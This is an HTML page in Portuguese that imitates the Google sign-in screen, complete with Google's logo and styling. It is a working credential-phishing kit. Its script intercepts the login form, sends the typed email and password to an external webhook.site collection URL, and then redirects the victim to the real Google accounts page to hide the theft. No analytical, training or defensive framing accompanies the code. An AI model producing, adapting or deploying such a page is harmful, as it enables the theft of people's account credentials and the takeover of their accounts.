<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Fazer login – Google</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background: #fff;
      margin: 0;
      padding: 0;
    }

    .login-card {
      max-width: 360px;
      margin: 100px auto;
      padding: 40px;
      border: 1px solid #dadce0;
      border-radius: 8px;
      box-shadow: 0px 1px 3px rgba(60,64,67,.3);
      text-align: center;
    }

    .login-card h1 {
      font-size: 24px;
      margin-bottom: 10px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 16px;
    }

    button {
      background: #1a73e8;
      color: white;
      border: none;
      padding: 10px 24px;
      margin-top: 20px;
      border-radius: 4px;
      font-weight: 500;
      cursor: pointer;
    }

    .logo {
      width: 75px;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>

<div class="login-card">
  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
  <h1>Fazer login</h1>
  <p>Use sua Conta do Google</p>
  <form id="loginForm">
    <input type="email" name="email" placeholder="Email ou telefone" required>
    <input type="password" name="senha" placeholder="Senha" required>
    <button type="submit">Próxima</button>
  </form>
</div>

<script>
  document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();

    const email = document.querySelector('input[name="email"]').value;
    const senha = document.querySelector('input[name="senha"]').value;

    fetch("https://webhook.site/f646599d-7bac-4074-8483-c4fa3d54713e", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, senha })
    }).then(() => {
      window.location.href = "https://accounts.google.com/";
    }).catch(err => console.error("Erro no envio:", err));
  });
</script>

</body>
</html>
